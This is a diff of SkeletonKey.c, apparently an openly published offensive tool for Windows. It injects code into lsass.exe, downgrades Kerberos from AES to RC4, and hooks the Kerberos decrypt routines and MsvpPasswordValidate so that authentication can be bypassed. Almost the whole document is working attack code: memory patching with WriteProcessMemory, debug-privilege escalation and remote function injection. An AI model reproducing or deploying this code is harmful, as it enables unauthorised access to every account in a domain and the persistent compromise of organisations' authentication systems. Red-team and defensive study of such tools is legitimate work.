@@ -1,3 +1,11 @@
+/*
+* Author : Angelo Frasca Caccia (lem0nSec_)
+* Data : 21/12/2023
+* Title : SkeletonKey.c
+* Website : https://github.com/lem0nSec/SkeletonKey
+*/
+
+
 #include "SkeletonKey.h"
 
 
@@ -5,9 +13,9 @@ wchar_t cryptdll[] = L"cryptdll.dll", msv1_0[] = L"msv1_0.dll";
 
 typedef BOOL(WINAPI* PMSVPPASSWORDVALIDATE)(LPSTR unk1, DWORD unk2, PVOID NTstruct, PLM_OWF_PASSWORD pRealPassword, PDWORD unk3, PUCHAR unk4, PVOID unk5);
 typedef NTSTATUS(WINAPI* PCDLOCATECSYSTEM)(ULONG Type, PKERB_ECRYPT* ppCSystem);
-typedef PVOID(__cdecl* PMEMCPY) (__out_bcount_full_opt(_MaxCount) void* _Dst, __in_bcount_opt(_MaxCount) const void* _Src, __in size_t _MaxCount); // 0x4141414141414141
-typedef HLOCAL(WINAPI* PLOCALALLOC) (__in UINT uFlags, __in SIZE_T uBytes); // 0x4242424242424242
-typedef HLOCAL(WINAPI* PLOCALFREE) (__deref HLOCAL hMem); // 0x4343434343434343
+typedef PVOID(__cdecl* PMEMCPY) (__out_bcount_full_opt(_MaxCount) void* _Dst, __in_bcount_opt(_MaxCount) const void* _Src, __in size_t _MaxCount);
+typedef HLOCAL(WINAPI* PLOCALALLOC) (__in UINT uFlags, __in SIZE_T uBytes);
+typedef HLOCAL(WINAPI* PLOCALFREE) (__deref HLOCAL hMem);
 
 
 #pragma optimize("", off)
@@ -108,13 +116,12 @@ DWORD Skel_rc4_end()
 #pragma optimize("", on)
 
 
-BOOL Skel_InstallOnKerbAuth(DWORD processID)
+BOOL Skel_InstallOnKerbAuth(DWORD processID, HANDLE hProcess)
 {
 	BOOL status = FALSE;
 	PCDLOCATECSYSTEM CDLocateCSystem = 0;
 	PKERB_ECRYPT pCrypt_aes128 = 0, pCrypt_aes256 = 0, pCrypt = 0;
 	SK_MODULE_INFORMATION pCryptInfo = { 0 };
-	HANDLE hProcess = 0;
 	HMODULE LocalCryptdllBase = 0;
 	LPVOID pattern_data = 0, pattern_struct = 0;
 	BOOL aesPackagesDisabled = FALSE;
@@ -129,90 +136,82 @@ BOOL Skel_InstallOnKerbAuth(DWORD processID)
 		{NULL, NULL, (PVOID)0x4b4b4b4b4b4b4b4b, NULL} // decrypt
 	};
 
-	if (Skel_EnableDebugPrivilege())
+	LocalCryptdllBase = GetModuleHandle(cryptdll);
+	if (LocalCryptdllBase == NULL)
 	{
-		PRINT_SUCCESS(L"Debug privilege ok\n");
-		hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, processID);
-		if (hProcess != NULL)
+		LocalCryptdllBase = LoadLibrary(cryptdll);
+	}
+	if (LocalCryptdllBase != NULL)
+	{
+		CDLocateCSystem = (PCDLOCATECSYSTEM)GetProcAddress(LocalCryptdllBase, "CDLocateCSystem");
+		if (CDLocateCSystem != 0)
 		{
-			LocalCryptdllBase = GetModuleHandle(cryptdll);
-			if (LocalCryptdllBase == NULL)
+			if ((NT_SUCCESS(CDLocateCSystem(0x11, &pCrypt_aes128))) && (NT_SUCCESS(CDLocateCSystem(0x12, &pCrypt_aes256))))
 			{
-				LocalCryptdllBase = LoadLibrary(cryptdll);
-			}
-			if (LocalCryptdllBase != NULL)
-			{
-				CDLocateCSystem = (PCDLOCATECSYSTEM)GetProcAddress(LocalCryptdllBase, "CDLocateCSystem");
-				if (CDLocateCSystem != 0)
-				{
-					if ((NT_SUCCESS(CDLocateCSystem(0x11, &pCrypt_aes128))) && (NT_SUCCESS(CDLocateCSystem(0x12, &pCrypt_aes256))))
-					{
-						aesPackagesDisabled = WriteProcessMemory(hProcess, (LPVOID)((PBYTE)pCrypt_aes128 + FIELD_OFFSET(KERB_ECRYPT, EncryptionType)), patch, sizeof(ULONG), NULL);
-						aesPackagesDisabled = WriteProcessMemory(hProcess, (LPVOID)((PBYTE)pCrypt_aes256 + FIELD_OFFSET(KERB_ECRYPT, EncryptionType)), patch, sizeof(ULONG), NULL);
-					}
-				}
-			}
-			
-			if (aesPackagesDisabled)
-			{
-				PRINT_SUCCESS(L"AES packages successfully disabled\n");
-				if (NT_SUCCESS(CDLocateCSystem(KERB_ETYPE_RC4_HMAC_NT, &pCrypt)))
-				{
-					PRINT_SUCCESS(L"KERB_ETYPE_RC4_HMAC_NT located: 0x%-016p\n", pCrypt);
-					Buffer = (LPVOID)LocalAlloc(LPTR, szFunc);
-					if (Buffer != NULL)
-					{
-						RtlCopyMemory(Buffer, Skel_rc4_init, szFunc);
-						RemotePtrs[3].Ptr = pCrypt->Initialize;
-						RemotePtrs[4].Ptr = pCrypt->Decrypt;
-						RemoteFunctions = Skel_ResolveFakeFunctionPointers(hProcess, Buffer, (DWORD)szFunc, (PSK_FUNCTION_PTR)&RemotePtrs, (DWORD)(sizeof(RemotePtrs) / sizeof(SK_FUNCTION_PTR)), TRUE);
-						if (RemoteFunctions != NULL)
-						{
-							PRINT_SUCCESS(L"Handlers up and ready\n");
-							pInitialize = RemoteFunctions;
-							pDecrypt = (LPVOID)((DWORD_PTR)RemoteFunctions + (DWORD)((DWORD_PTR)Skel_rc4_init_decrypt - (DWORD_PTR)Skel_rc4_init));
-							if (
-								(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Initialize)), (LPCVOID)&pInitialize, sizeof(PVOID), NULL)) &&
-								(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Decrypt)), (LPCVOID)&pDecrypt, sizeof(PVOID), NULL))
-								)
-							{
-								PRINT_SUCCESS(L"Connectors ok\n");
-								status = TRUE;
-							}
-							else
-							{
-								PRINT_ERROR(L"Patching error. Freeing memory...\n");
-								VirtualFreeEx(hProcess, RemoteFunctions, 0, MEM_RELEASE);
-							}
-						}
-						else
-							PRINT_ERROR(L"Remote function building error.\n");
-					}
-					else
-						PRINT_ERROR(L"Heap allocation error.\n");
-				}
-				else
-					PRINT_ERROR(L"CDLocateCSystem error.\n");
+				PRINT_SUCCESS(L"Patching packages : AES128 : 0x%-016p <--> 0x%-016p : AES256\n", pCrypt_aes128, pCrypt_aes256);
+				aesPackagesDisabled = WriteProcessMemory(hProcess, (LPVOID)((PBYTE)pCrypt_aes128 + FIELD_OFFSET(KERB_ECRYPT, EncryptionType)), patch, sizeof(ULONG), NULL);
+				aesPackagesDisabled = WriteProcessMemory(hProcess, (LPVOID)((PBYTE)pCrypt_aes256 + FIELD_OFFSET(KERB_ECRYPT, EncryptionType)), patch, sizeof(ULONG), NULL);
 			}
 			else
-				PRINT_ERROR(L"RC4 downgrading error.\n");
+				PRINT_ERROR(L"AES packages not found.\n");
+		}
+	}
 			
-			CloseHandle(hProcess);
+	if (aesPackagesDisabled)
+	{
+		PRINT_SUCCESS(L"AES packages successfully disabled. RC4 fallback expected.\n");
+		if (NT_SUCCESS(CDLocateCSystem(KERB_ETYPE_RC4_HMAC_NT, &pCrypt)))
+		{
+			PRINT_SUCCESS(L"KERB_ETYPE_RC4_HMAC_NT located: 0x%-016p\n", pCrypt);
+			Buffer = (LPVOID)LocalAlloc(LPTR, szFunc);
+			if (Buffer != NULL)
+			{
+				RtlCopyMemory(Buffer, Skel_rc4_init, szFunc);
+				RemotePtrs[3].Ptr = pCrypt->Initialize;
+				RemotePtrs[4].Ptr = pCrypt->Decrypt;
+				RemoteFunctions = Skel_ResolveFakeFunctionPointers(hProcess, Buffer, (DWORD)szFunc, (PSK_FUNCTION_PTR)&RemotePtrs, (DWORD)(sizeof(RemotePtrs) / sizeof(SK_FUNCTION_PTR)), TRUE);
+				if (RemoteFunctions != NULL)
+				{
+					PRINT_SUCCESS(L"Handlers up and ready\n");
+					pInitialize = RemoteFunctions;
+					pDecrypt = (LPVOID)((DWORD_PTR)RemoteFunctions + (DWORD)((DWORD_PTR)Skel_rc4_init_decrypt - (DWORD_PTR)Skel_rc4_init));
+					if (
+						(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Initialize)), (LPCVOID)&pInitialize, sizeof(PVOID), NULL)) &&
+						(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Decrypt)), (LPCVOID)&pDecrypt, sizeof(PVOID), NULL))
+						)
+					{
+						PRINT_SUCCESS(L"Connectors ok\n");
+						status = TRUE;
+					}
+					else
+					{
+						PRINT_ERROR(L"Patching error. Freeing memory...\n");
+						VirtualFreeEx(hProcess, RemoteFunctions, 0, MEM_RELEASE);
+					}
+				}
+				else
+					PRINT_ERROR(L"Remote function building error.\n");
+			}
+			else
+				PRINT_ERROR(L"Heap allocation error.\n");
 		}
 		else
-			PRINT_ERROR(L"Could not open process %d (0x%ld). Aborting...\n", processID, GetLastError());
+			PRINT_ERROR(L"CDLocateCSystem error.\n");
 	}
+	else
+		PRINT_ERROR(L"RC4 downgrading error.\n");
+			
+	CloseHandle(hProcess);
 
 	return status;
 
 }
 
-BOOL Skel_InstallOnNtlmAuth(DWORD processID)
+BOOL Skel_InstallOnNtlmAuth(DWORD processID, HANDLE hProcess)
 {
 	BOOL status = FALSE;
 	SIZE_T szFunc = (SIZE_T)((PBYTE)Skel_MsvpPasswordValidate_end - (PBYTE)Skel_MsvpPasswordValidate);
 	SK_MODULE_INFORMATION pCryptInfo = { 0 };
-	HANDLE hProcess = 0;
 	HMODULE LocalCryptdllBase = 0;
 	LPVOID pattern_data = 0, pattern_struct = 0;
 	DWORD oldProtection = 0;
@@ -224,73 +223,63 @@ BOOL Skel_InstallOnNtlmAuth(DWORD processID)
 		{L"ntlmshared.dll", "MsvpPasswordValidate", (PVOID)0x3131313131313131, NULL}
 	};
 	
-	if (Skel_EnableDebugPrivilege())
+	Buffer = (LPVOID)LocalAlloc(LPTR, szFunc);
+	if (Buffer != 0)
 	{
-		PRINT_SUCCESS(L"Debug privilege ok\n");
-		hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, processID);
-		if (hProcess)
+		RtlCopyMemory(Buffer, Skel_MsvpPasswordValidate, szFunc);
+		RemoteFunctions = Skel_ResolveFakeFunctionPointers(hProcess, Buffer, (DWORD)szFunc, (PSK_FUNCTION_PTR)&RemotePtrs, (DWORD)(sizeof(RemotePtrs) / sizeof(SK_FUNCTION_PTR)), FALSE);
+		if (RemoteFunctions == (LPVOID)1)
 		{
-			Buffer = (LPVOID)LocalAlloc(LPTR, szFunc);
-			if (Buffer != 0)
+			RemoteFunctions = 0;
+			if (Skel_GetRemoteModuleInformation(processID, msv1_0, &pCryptInfo))
 			{
-				RtlCopyMemory(Buffer, Skel_MsvpPasswordValidate, szFunc);
-				RemoteFunctions = Skel_ResolveFakeFunctionPointers(hProcess, Buffer, (DWORD)szFunc, (PSK_FUNCTION_PTR)&RemotePtrs, (DWORD)(sizeof(RemotePtrs) / sizeof(SK_FUNCTION_PTR)), FALSE);
-				if (RemoteFunctions == (LPVOID)1)
+				pMsvpPasswordValidateOrig = RemotePtrs[3].Ptr;
+				pattern_data = Skel_SearchRemotePatternInLoadedModule(hProcess, &pCryptInfo, (LPCVOID)&pMsvpPasswordValidateOrig, sizeof(PVOID));
+				if (pattern_data != 0)
 				{
-					RemoteFunctions = 0;
-					if (Skel_GetRemoteModuleInformation(processID, msv1_0, &pCryptInfo))
+					PRINT_SUCCESS(L"Pattern found : 0x%-016p\n", pattern_data);
+					RemoteFunctions = Skel_ResolveFakeFunctionPointers(hProcess, Buffer, (DWORD)szFunc, (PSK_FUNCTION_PTR)&RemotePtrs, (DWORD)(sizeof(RemotePtrs) / sizeof(SK_FUNCTION_PTR)), TRUE);
+					if (RemoteFunctions > (LPVOID)1)
 					{
-						pMsvpPasswordValidateOrig = RemotePtrs[3].Ptr;
-						pattern_data = Skel_SearchRemotePatternInLoadedModule(hProcess, &pCryptInfo, (LPCVOID)&pMsvpPasswordValidateOrig, sizeof(PVOID));
-						if (pattern_data != 0)
+						PRINT_SUCCESS(L"Handler up and ready\n");
+						if (VirtualProtectEx(hProcess, pattern_data, sizeof(PVOID), PAGE_READWRITE, &oldProtection))
 						{
-							PRINT_SUCCESS(L"Pattern found : 0x%-016p\n", pattern_data);
-							RemoteFunctions = Skel_ResolveFakeFunctionPointers(hProcess, Buffer, (DWORD)szFunc, (PSK_FUNCTION_PTR)&RemotePtrs, (DWORD)(sizeof(RemotePtrs) / sizeof(SK_FUNCTION_PTR)), TRUE);
-							if (RemoteFunctions > (LPVOID)1)
+							PRINT_SUCCESS(L"Pattern area is now -RW-\n");
+							if (WriteProcessMemory(hProcess, pattern_data, (LPCVOID)&RemoteFunctions, sizeof(PVOID), NULL))
 							{
-								PRINT_SUCCESS(L"Handler up and ready\n");
-								if (VirtualProtectEx(hProcess, pattern_data, sizeof(PVOID), PAGE_READWRITE, &oldProtection))
-								{
-									PRINT_SUCCESS(L"Pattern area is now -RW-\n");
-									if (WriteProcessMemory(hProcess, pattern_data, (LPCVOID)&RemoteFunctions, sizeof(PVOID), NULL))
-									{
-										PRINT_SUCCESS(L"Connector patched\n");
-									}
-									else
-									{
-										PRINT_ERROR(L"Patching error. Freeing memory...\n");
-										VirtualFreeEx(hProcess, pattern_data, 0, MEM_RELEASE);
-									}
-									if (VirtualProtectEx(hProcess, pattern_data, sizeof(PVOID), PAGE_READONLY, &oldProtection))
-									{
-										PRINT_SUCCESS(L"Pattern area protection restored to -R-\n");
-									}
-									else
-										PRINT_ERROR(L"Protection error. Pattern area remains -RW-\n");
-								}
-								else
-									PRINT_ERROR(L"Protection error. Cannot change memory protection\n");
+								PRINT_SUCCESS(L"Connector patched\n");
 							}
 							else
-								PRINT_ERROR(L"Remote function injection error.\n");
+							{
+								PRINT_ERROR(L"Patching error. Freeing memory...\n");
+								VirtualFreeEx(hProcess, pattern_data, 0, MEM_RELEASE);
+							}
+							if (VirtualProtectEx(hProcess, pattern_data, sizeof(PVOID), PAGE_READONLY, &oldProtection))
+							{
+								PRINT_SUCCESS(L"Pattern area protection restored to -R-\n");
+							}
+							else
+								PRINT_ERROR(L"Protection error. Pattern area remains -RW-\n");
 						}
 						else
-							PRINT_ERROR(L"Remote pattern not found. System already patched (?). Aborting...\n");
+							PRINT_ERROR(L"Protection error. Cannot change memory protection\n");
 					}
 					else
-						PRINT_ERROR(L"%s could not be loaded (0x%ld). Aborting...\n", msv1_0, GetLastError());
+						PRINT_ERROR(L"Remote function injection error.\n");
 				}
 				else
-					PRINT_ERROR(L"Remote function building error.\n");
+					PRINT_ERROR(L"Remote pattern not found. System already patched (?). Aborting...\n");
 			}
 			else
-				PRINT_ERROR(L"Heap allocation error.\n");
-			
-			CloseHandle(hProcess);
+				PRINT_ERROR(L"%s could not be loaded (0x%ld). Aborting...\n", msv1_0, GetLastError());
 		}
 		else
-			PRINT_ERROR(L"Could not open process %d (0x%ld). Aborting...\n", processID, GetLastError());
+			PRINT_ERROR(L"Remote function building error.\n");
 	}
+	else
+		PRINT_ERROR(L"Heap allocation error.\n");
+			
+	CloseHandle(hProcess);	
 
 	return status;
 
@@ -300,31 +289,45 @@ BOOL Skel_InstallOnNtlmAuth(DWORD processID)
 BOOL wmain(int argc, wchar_t* argv[])
 {
 	DWORD processID = 0;
+	HANDLE hProcess = 0;
 
 	if (argc < 2)
 	{
 		goto help;
 	}
-	
-	if (wcscmp(argv[1], L"--KerbAuth") == 0)
+	else if ((wcscmp(argv[1], L"--KerbAuth") == 0) || (wcscmp(argv[1], L"--NtlmAuth") == 0))
 	{
 		processID = Skel_ValidateLsassPid();
 		if (processID != 0)
-			return Skel_InstallOnKerbAuth(processID);
+		{
+			if (Skel_EnableDebugPrivilege())
+			{
+				PRINT_SUCCESS(L"Debug privilege OK.\n");
+				hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, processID);
+				if (hProcess)
+				{
+					if (wcscmp(argv[1], L"--KerbAuth") == 0)
+						return Skel_InstallOnKerbAuth(processID, hProcess);
+					else if (wcscmp(argv[1], L"--NtlmAuth") == 0)
+						return Skel_InstallOnNtlmAuth(processID, hProcess);
+				}
+				else
+				{
+					PRINT_ERROR(L"Process handle error.\n");
+					return FALSE;
+				}
+			}
+			else
+			{
+				PRINT_ERROR(L"Debug privilege error.\n");
+				return FALSE;
+			}
+		}
 		else
-			PRINT_ERROR(L"lsass.exe not found (?). Aborting...\n");
-	}
-	else if (wcscmp(argv[1], L"--NtlmAuth") == 0)
-	{
-		processID = Skel_ValidateLsassPid();
-		if (processID != 0)
-			return Skel_InstallOnNtlmAuth(processID);
-		else
-			PRINT_ERROR(L"lsass.exe not found (?). Aborting...\n");
-	}
-	else
-	{
-		goto help;
+		{
+			PRINT_ERROR(L"lsass.exe. PID not found (?)... Aborting.\n");
+			return FALSE;
+		}
 	}
 
 help:
